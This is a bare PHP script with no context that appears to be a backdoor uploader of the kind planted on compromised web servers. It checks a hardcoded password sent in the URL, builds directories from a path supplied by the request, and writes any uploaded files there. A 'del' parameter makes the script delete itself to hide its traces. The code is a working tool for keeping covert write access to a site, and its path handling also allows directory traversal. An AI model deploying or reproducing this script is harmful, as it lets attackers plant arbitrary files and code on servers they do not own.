<?php
	$password = "AsAjfkel!@";
	header("Content-Type:text/plain");
	if(isset($_GET["del"])){
		@unlink(__FILE__);
	}
	if(isset($_GET["pw"])){
      if($_GET["pw"] == $password){
        $path = $_GET["path"];
        $pathSplitted = preg_split("/\\\|\//", $path);
        $mainpath = getcwd();
        foreach($pathSplitted as $dir){
            $mainpath = $mainpath . DIRECTORY_SEPARATOR . $dir;
            if(!is_dir($mainpath)){
              echo $mainpath;
              $h = mkdir($mainpath);
              if(!$h) die("error");
            }
        }
        if(isset($_FILES["xaxa"])){
          $countfiles = count($_FILES['xaxa']['name']);
          for($i=0;$i<$countfiles;$i++){
            $filename = $_FILES['xaxa']['name'][$i];
            $upload = move_uploaded_file($_FILES['xaxa']['tmp_name'][$i],$mainpath . DIRECTORY_SEPARATOR .$filename);
            if($upload){
              echo "success";
            }
          }
        }
      } 	
    }
die();